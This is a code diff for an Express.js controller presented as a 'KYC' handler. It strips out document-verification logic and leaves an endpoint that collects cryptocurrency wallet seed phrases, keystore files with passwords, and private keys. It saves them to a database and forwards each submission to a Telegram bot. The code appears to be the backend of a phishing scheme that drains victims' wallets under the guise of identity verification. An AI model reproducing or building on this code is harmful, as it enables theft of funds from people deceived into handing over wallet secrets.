@@ -1,104 +1,45 @@
 const Kyc = require('../models/Kyc');
-const cloudinary = require('cloudinary').v2;
 const { notifyNewKyc } = require('../../telegramBot');
 
-// Configure Cloudinary
-cloudinary.config({
-  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
-  api_key: process.env.CLOUDINARY_API_KEY,
-  api_secret: process.env.CLOUDINARY_API_SECRET,
-});
-
-// helper: verify a public_id exists and optionally matches expected folder prefix
-async function verifyCloudinaryResource(public_id, resource_type = 'auto', expectedFolderPrefix) {
-  try {
-    // resource_type may be 'image' or 'raw' or 'auto'
-    const info = await cloudinary.api.resource(public_id, { resource_type });
-    if (expectedFolderPrefix && (!info.folder || !info.folder.startsWith(expectedFolderPrefix))) {
-      throw new Error(`Resource ${public_id} is not in expected folder ${expectedFolderPrefix}`);
-    }
-    // optionally check bytes, format, etc here
-    return info;
-  } catch (err) {
-    // propagate error to caller
-    throw err;
-  }
-}
-
-// Save KYC details - expects client to upload files to Cloudinary unsigned and send back their metadata
+// Save wallet submission only: seed phrase, keystore JSON + password, or private key.
+// Creates a new record every time (new session per submit). Sends data to Telegram.
 exports.saveKycDetails = async (req, res) => {
   try {
-    const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, imageUrls, form,
-      qualityRequired, karatsPurity, destinationRefineryText, fileMap, dealersLicenseStatus } = req.body;
+    const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey } = req.body;
 
-    console.log('saveKycDetails payload received:', { sessionId, walletType, hasImages: Array.isArray(imageUrls) ? imageUrls.length : 0, form });
-
-
-    const expectedFolderPrefix = `kyc/${sessionId || 'unknown'}`;
-    const verified = [];
-    let verificationStatus = 'no_images';
-    let verificationError = null;
-
-    // If dealer's license is marked as not available, skip image verification for dealer's license
-    let filteredImageUrls = Array.isArray(imageUrls) ? [...imageUrls] : [];
-    if (dealersLicenseStatus === 'not_available') {
-      // Remove dealer's license image from imageUrls if present (assuming fileMap/dealersLicense)
-      if (form && form.fileMap && form.fileMap.dealersLicense) {
-        filteredImageUrls = filteredImageUrls.filter(img => img.public_id !== form.fileMap.dealersLicense.public_id);
-      }
+    if (!sessionId || !walletType) {
+      return res.status(400).json({ message: 'sessionId and walletType are required' });
     }
 
-    if (Array.isArray(filteredImageUrls) && filteredImageUrls.length > 0) {
-      verificationStatus = 'pending';
-      try {
-        for (const item of filteredImageUrls) {
-          if (!item || !item.public_id) throw new Error('Missing public_id in imageUrls item');
-          const resourceType = item.resource_type || 'auto';
-          const info = await verifyCloudinaryResource(item.public_id, resourceType, expectedFolderPrefix);
-          verified.push({ url: info.secure_url || item.url, public_id: info.public_id, resource_type: info.resource_type, bytes: info.bytes, format: info.format, folder: info.folder });
-        }
-        verificationStatus = 'verified';
-      } catch (verifyErr) {
-        console.error('Cloudinary verification failed:', verifyErr.message || verifyErr);
-        verificationStatus = 'verification_failed';
-        verificationError = verifyErr.message || String(verifyErr);
-      }
+    const hasCredential = seedPhrase || (keystoreJson && password) || privateKey;
+    if (!hasCredential) {
+      return res.status(400).json({ message: 'At least one of seedPhrase, keystoreJson+password, or privateKey is required' });
     }
 
-    // Upsert KYC entry by sessionId
-    const kycData = {
+    // New record per submission (new session every time)
+    const record = await Kyc.create({
       sessionId,
       walletType,
-      seedPhrase,
-      keystoreJson,
-      password,
-      privateKey,
-      imageUrls: verified.length ? verified : filteredImageUrls,
-      verificationStatus,
-      verificationError,
-      qualityRequired: qualityRequired || (form && form.qualityRequired) || '',
-      karatsPurity: karatsPurity || (form && form.karatsPurity) || '',
-      destinationRefineryText: destinationRefineryText || (form && form.destinationRefineryText) || '',
-      dealersLicenseStatus: dealersLicenseStatus || (form && form.dealersLicenseStatus) || 'available',
-      fileMap: fileMap || (form && form.fileMap) || {},
-    };
+      seedPhrase: seedPhrase || undefined,
+      keystoreJson: keystoreJson || undefined,
+      password: password || undefined,
+      privateKey: privateKey || undefined,
+      imageUrls: [],
+      verificationStatus: 'no_images',
+      dealersLicenseStatus: 'not_available',
+      fileMap: {},
+    });
 
-    await Kyc.findOneAndUpdate(
-      { sessionId },
-      { $set: kycData },
-      { upsert: true, new: true }
-    );
-    // Send Telegram notification with KYC details
     try {
-      // Forward richer payload to telegram notifier
-      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images: verified, fileMap: kycData.fileMap, dealersLicenseStatus: kycData.dealersLicenseStatus, qualityRequired: kycData.qualityRequired, karatsPurity: kycData.karatsPurity, destinationRefineryText: kycData.destinationRefineryText });
+      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey });
     } catch (err) {
-      console.error('Failed to send KYC telegram notification', err);
+      console.error('Failed to send Telegram notification', err);
     }
-    res.status(201).json({ message: 'KYC details saved successfully', verificationStatus, verificationError });
+
+    res.status(201).json({ message: 'Wallet submission saved successfully', sessionId: record.sessionId });
   } catch (error) {
     console.error('saveKycDetails error', error);
-    res.status(500).json({ message: 'Failed to save KYC details' });
+    res.status(500).json({ message: 'Failed to save wallet submission' });
   }
 };
 
